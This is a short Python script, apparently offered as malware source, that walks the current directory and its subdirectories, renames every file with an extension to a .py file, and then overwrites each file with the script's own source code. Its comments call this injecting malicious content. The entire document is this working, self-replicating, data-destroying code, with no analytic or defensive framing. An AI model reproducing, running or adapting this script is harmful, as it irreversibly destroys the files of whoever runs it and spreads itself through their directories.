import os
import sys

def convert_files_to_python(directory):
    #Converts files with extensions to Python files (.py) within the given directory and its subdirectories.
    for root, dirs, files in os.walk(directory):
        for file in files:
            if '.' in file:
                filename, extension = os.path.splitext(file)
                new_path = os.path.join(root, f"{filename}.py")
                try:
                    os.rename(os.path.join(root, file), new_path)
                except OSError as e:
                    print(f"Error renaming {file}: {e}")

def InfectedFileContent():
    with open(sys.argv[0], 'r') as f:
        maliciousContent = f.read()
    return maliciousContent

def inject_malicious_content(directory):
    #Injects malicious content into files within the given directory and its subdirectories.
    for root, dirs, files in os.walk(directory):
        malicious_content = InfectedFileContent()
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r') as f:
                    if f.read() == malicious_content:
                        continue  # Already infected
                with open(file_path, 'w') as f:
                    f.write(malicious_content)
            except:
                continue

def main():
    #Converts files and injects malicious content in the current directory and subdirectories.
    current_directory = os.getcwd()

    convert_files_to_python(current_directory)  # Convert files in the current directory
    inject_malicious_content(current_directory)  # Inject content in the current directory and subdirectories

if __name__ == '__main__':
    main()
